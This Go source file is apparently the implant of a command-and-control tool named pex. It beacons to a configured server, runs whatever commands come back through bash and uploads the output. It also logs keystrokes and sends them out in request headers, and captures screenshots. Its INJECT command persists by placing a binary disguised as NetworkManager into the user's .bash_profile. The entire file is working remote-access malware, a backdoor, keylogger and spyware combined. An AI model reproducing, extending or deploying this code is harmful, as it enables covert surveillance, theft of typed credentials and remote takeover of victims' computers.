package agent

import (
	"bytes"
	"fmt"
	"io"
	"log/slog"
	"math/rand/v2"
	"net/http"
	"os"
	"os/exec"
	"strings"
	"time"

	"github.com/hardal7/pex/internal/config"
)

func Serve() {
	for {
		makeRequest()
		delay := float32(config.Jitter) * rand.Float32()
		time.Sleep(time.Duration(float32(config.Interval)+delay) * time.Second)
	}
}

type Loot struct {
	Kind    string
	Content string
}

func makeRequest() {
	requestURL := "http://" + config.Host + ":" + config.Port
	request, _ := http.NewRequest("GET", requestURL, nil)
	setHeaders(*request)

	response, err := http.DefaultClient.Do(request)
	if err != nil {
		slog.Info("Failed to send request to server: " + err.Error())
		return
	} else {
		slog.Info("Sent ping to server")
	}

	body, _ := io.ReadAll(response.Body)
	if len(body) != 0 {
		command := strings.Fields(string(body[:]))
		loot := runCommand(command)

		slog.Info("Sending loot to server")
		if loot.Kind == "Image" {
			buffer, _ := os.ReadFile(loot.Content)
			_, err = http.Post(requestURL, "image/png", bytes.NewBuffer(buffer))
		} else {
			_, err = http.Post(requestURL, "text/plain", bytes.NewBuffer([]byte(loot.Content)))
		}
		if err != nil {
			slog.Info("Failed sending loot to server: " + err.Error())
		} else {
			slog.Info("Sent loot to server")
		}
	} else {
		slog.Info("Received ping from server")
	}
}

var username string

func setHeaders(r http.Request) {
	if username == "" {
		slog.Info("Getting username")
		username = executeCommand([]string{"whoami"})
	}
	username = strings.TrimSpace(username)
	r.Header.Set("Username", username)
	go readKeys(r)
}

var isLoggingKeys bool
var previousKeys string

func readKeys(request http.Request) {
	if isLoggingKeys {
		var keysLoot string
		mu.Lock()
		keysLoot = strings.TrimPrefix(keysPressed, previousKeys)
		previousKeys = keysPressed
		mu.Unlock()
		if len(keysPressed) != 0 {
			request.Header.Set("Keys", keysLoot)
			http.DefaultClient.Do(&request)
		}
	}
}

func runCommand(command []string) Loot {
	var loot Loot
	switch command[0] {
	case "INJECT":
		loot.Content = executeCommand([]string{"echo '/usr/local/bin/NetworkManager' >> /home/$(whoami)/.bash_profile; mv ./NetworkManager /usr/local/bin/NetworkManager"})
	case "LOGKEYS":
		isLoggingKeys = true
		go LogKeyboard()
	case "STOP-LOGKEYS":
		isLoggingKeys = false
		// TODO: Signal go routine to stop
	case "SCREEN":
		screenshots := CaptureScreen()
		loot.Kind = "Image"
		// TODO: Send more than 1 screenshot for multiple monitor setups
		loot.Content = screenshots[0]
	default:
		slog.Info("Executing command: " + command[0])
		loot.Content = executeCommand(command)
		slog.Info("Output:\n" + loot.Content)
	}
	slog.Info("Executed command")

	return loot
}

func executeCommand(command []string) string {
	var stdout bytes.Buffer
	var stderr bytes.Buffer

	var commandExists bool = false
	var cmd *exec.Cmd
	if len(command) != 0 {
		command = append([]string{"-c"}, strings.Join(command, " "))
		cmd = exec.Command("bash", command...)
		commandExists = true
	}

	if commandExists {
		cmd.Stdout = &stdout
		cmd.Stderr = &stderr

		err := cmd.Run()
		if err != nil {
			slog.Error("Failed executing command: " + err.Error())
			fmt.Println(command)
		}
	}
	if stderr.String() != "" {
		slog.Info("Error Output: " + stderr.String())
	}

	return stdout.String() + stderr.String()
}
